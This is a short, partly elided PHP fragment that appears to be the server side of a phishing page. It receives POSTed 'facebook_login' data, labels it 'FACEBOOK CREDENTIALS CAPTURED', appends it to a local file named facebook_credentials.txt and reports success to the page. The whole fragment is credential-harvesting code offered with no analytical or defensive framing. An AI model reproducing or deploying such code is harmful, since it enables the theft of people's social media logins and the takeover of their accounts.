...
if($_SERVER['REQUEST_METHOD'] == "POST"){
    ...
    $formattedData = "=== FACEBOOK CREDENTIALS CAPTURED ===\n";
    ...
    if(isset($decodedData['type']) && $decodedData['type'] == 'facebook_login') {
    ...
    file_put_contents("facebook_credentials.txt", $formattedData, FILE_APPEND | LOCK_EX);
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success', 'message' => 'Facebook credentials saved successfully']);
} else {
    header('Content-Type: application/json');
